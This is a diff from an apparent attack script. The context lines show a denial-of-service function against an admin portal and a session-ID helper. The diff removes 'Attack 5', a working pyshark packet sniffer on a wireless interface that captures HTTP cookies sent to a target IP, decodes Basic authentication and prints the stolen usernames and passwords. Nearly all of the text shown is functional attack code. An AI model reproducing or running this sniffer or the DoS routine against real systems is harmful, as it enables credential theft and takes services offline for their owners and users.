@@ -202,42 +202,6 @@ def dos_admin_portal(target_url: str):
     print(f"[+] The Admin Portal has been successfully taken down!")
 
 
-# Attack 5 - listening for password/cookie
-def listen_for_admin(target_ip: str):
-    threading.Thread(target=packet_capture, args=(target_ip,), daemon=True).start()
-
-
-def packet_capture(target_ip: str):
-    capture = pyshark.LiveCapture(interface="wlan1")
-    seen = set()
-
-    for packet in capture.sniff_continuously():
-        try:
-            if "ip" not in packet:
-                continue
-            if packet["ip"].dst == target_ip:
-                if "http" in packet:
-                    fields = packet.http._all_fields
-                    if "http.cookie_pair" in fields:
-                        cookie = unquote(fields["http.cookie_pair"])
-                        if cookie in seen:
-                            continue
-                        else:
-                            seen.add(cookie)
-
-                        if cookie.startswith("Authorization"):
-                            auth_encoded_string = cookie.removeprefix(
-                                "Authorization=Basic"
-                            ).strip()
-                            creds_string = base64.b64decode(auth_encoded_string).decode(
-                                "UTF-8"
-                            )
-                            username, password = creds_string.split(":")
-                            print("Found credential pair:", username, password)
-        except:
-            continue
-
-
 def get_sessionID(target_url: str, token: str) -> str:
     if not target_url.endswith("/"):
         target_url += "/"
